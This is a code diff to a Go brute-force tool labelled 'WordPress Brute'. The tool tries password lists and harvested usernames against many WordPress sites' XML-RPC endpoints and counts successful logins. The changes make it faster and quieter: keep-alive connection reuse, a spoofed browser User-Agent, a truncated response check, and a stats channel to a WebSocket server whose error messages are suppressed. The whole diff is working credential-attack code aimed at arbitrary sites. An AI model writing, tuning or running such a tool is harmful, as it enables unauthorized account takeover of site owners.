@@ -122,15 +122,10 @@ func wpbrute(url string, client *http.Client) error {
 		username: usernames,
 	}
 
-	// Read password list
-	xPassword, err := ReadFile(passFile)
-	if err != nil {
-		return err
-	}
 	if checkXMLRPC(url, client) {
 		WordPress++
 		// Try each password pattern
-		for _, pattern := range xPassword {
+		for _, pattern := range xPasswords {
 			// Try for each extracted username
 			for _, username := range info.username {
 				var password string
@@ -149,10 +144,6 @@ func wpbrute(url string, client *http.Client) error {
 					}
 				} else {
 					password = pattern
-				}
-
-				if password == "" {
-					continue
 				}
 
 				// Try to connect with generated credentials
@@ -203,16 +194,16 @@ func displayProgress() {
 	}
 	bar := strings.Repeat(progressBar, filled) + strings.Repeat(emptyBar, barWidth-filled)
 
-	output := fmt.Sprintf("\n╭──────────── WordPress Brute ────────────╮\n"+
-		"│ Progress: %s %.1f%% │\n"+
-		"├─────────────────────────────────────────┤\n"+
-		"│ Total URLs: %-27d │\n"+
-		"│ Processed: %-28d │\n"+
-		"│ WordPress: %-28d │\n"+
-		"│ Success: %-30d │\n"+
-		"│ Failed: %-31d │\n"+
-		"│ Attempts: %-29d │\n"+
-		"╰─────────────────────────────────────────╯\n",
+	output := fmt.Sprintf("\n╭──────────── WordPress Brute 🔓 ────────────╮\n"+
+		"│ Progress: %s %.1f%% ⏳ │\n"+
+		"├────────────────────────────────────────────┤\n"+
+		"│ Total URLs: %-27d 🌐 │\n"+
+		"│ Processed: %-28d ✅ │\n"+
+		"│ WordPress: %-28d 📝 │\n"+
+		"│ Success: %-30d 🎯 │\n"+
+		"│ Failed: %-31d ❌ │\n"+
+		"│ Attempts: %-29d 🔄 │\n"+
+		"╰────────────────────────────────────────────╯\n",
 		bar, percentage, total, progress, WordPress, goods, bad, tries)
 
 	fmt.Fprint(writer, output)
@@ -221,29 +212,29 @@ func displayProgress() {
 
 // Checks if XML-RPC is enabled on WordPress site
 func checkXMLRPC(url string, client *http.Client) bool {
-	// Construct the full URL for the xmlrpc.php file
 	xmlrpcURL := url + "/xmlrpc.php"
 
-	// Send a GET request to the xmlrpc.php endpoint
-	resp, err := client.Get(xmlrpcURL)
+	req, err := http.NewRequest("GET", xmlrpcURL, nil)
+	if err != nil {
+		return false
+	}
+
+	// Add performance headers
+	req.Header.Set("Connection", "keep-alive")
+	req.Close = false
+
+	resp, err := client.Do(req)
 	if err != nil {
 		return false
 	}
 	defer resp.Body.Close()
 
-	// Read response body to check for XML-RPC server
-	body, err := io.ReadAll(resp.Body)
-	if err != nil {
-		return false
-	}
+	// Only read the first 1KB of response to check for XML-RPC
+	body := make([]byte, 1024)
+	n, _ := io.ReadAtLeast(resp.Body, body, 1)
+	bodyStr := string(body[:n])
 
-	// Check if response contains XML-RPC server error message
-	if strings.Contains(string(body), "XML-RPC server accepts POST requests only") {
-		return true
-	}
-
-	// Also check status code as fallback
-	return resp.StatusCode == 405
+	return strings.Contains(bodyStr, "XML-RPC server accepts POST requests only")
 }
 
 // Tests WordPress login credentials via XML-RPC
@@ -268,8 +259,12 @@ func connectToWordPress(url, username, password string, client *http.Client) err
 	if err != nil {
 		return fmt.Errorf("failed to create request: %w", err)
 	}
+
+	// Add additional performance-oriented headers
 	req.Header.Set("Content-Type", "text/xml")
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+	req.Header.Set("Connection", "keep-alive")
+	req.Close = false // Enable connection reuse
 
 	// Send request
 	resp, err := client.Do(req)
@@ -313,7 +308,7 @@ start:
 	// Create WebSocket connection
 	c, _, err := websocket.DefaultDialer.Dial(wsURL, nil)
 	if err != nil {
-		fmt.Printf("WebSocket connection error: %v\n", err)
+
 		time.Sleep(1 * time.Second)
 		goto start
 	}
@@ -341,7 +336,7 @@ start:
 
 		err = c.WriteJSON(message)
 		if err != nil {
-			fmt.Printf("Error sending stats data: %v\n", err)
+
 			time.Sleep(1 * time.Second)
 			goto start
 		}
